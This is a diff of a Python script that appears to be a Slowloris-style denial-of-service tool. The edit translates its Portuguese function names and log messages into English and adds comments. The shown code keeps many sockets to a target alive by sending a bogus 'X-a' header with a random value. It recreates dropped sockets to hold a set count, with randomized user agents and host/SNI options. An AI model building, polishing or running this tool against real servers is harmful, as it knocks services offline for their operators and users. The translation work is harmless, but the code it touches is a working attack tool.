@@ -53,7 +53,7 @@ def init_socket(
         send_header(s, "Accept-language", "en-US,en,q=0.5")
         return s
     except Exception as e:
-        logging.debug(f"Falha ao criar socket: {e}")
+        logging.debug(f"Failed to create socket: {e}")
         return None
 
 
@@ -67,6 +67,7 @@ def iteration_keepalive(
         host_header: Optional[str],
         sni_name: Optional[str],
 ) -> None:
+    # Send a bogus header and recreate missing sockets
     for s in list(sockets):
         try:
             send_header(s, "X-a", random.randint(1, 5000))
@@ -79,14 +80,15 @@ def iteration_keepalive(
 
     missing = desired_count - len(sockets)
     if missing > 0:
-        logging.info(f"Criando {missing} novos sockets...")
+        logging.info(f"Creating {missing} new sockets...")
         for _ in range(missing):
             s_new = init_socket(ip, port, https, rand_user_agents, host_header, sni_name)
             if s_new:
                 sockets.append(s_new)
 
 
-def ip_ativo(ip: str, port: int = 80) -> bool:
+def is_ip_reachable(ip: str, port: int = 80) -> bool:
+    """Lightweight reachability check (TCP connect)."""
     try:
         socket.setdefaulttimeout(3)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -97,11 +99,12 @@ def ip_ativo(ip: str, port: int = 80) -> bool:
         return False
 
 
-def porta_ativa(ip: str, porta: int) -> bool:
+def is_port_open(ip: str, port: int) -> bool:
+    """Check if a port is open and responds to a simple HTTP probe."""
     try:
         socket.setdefaulttimeout(3)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, porta))
+        s.connect((ip, port))
         s.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
         _ = s.recv(1024)
         s.close()
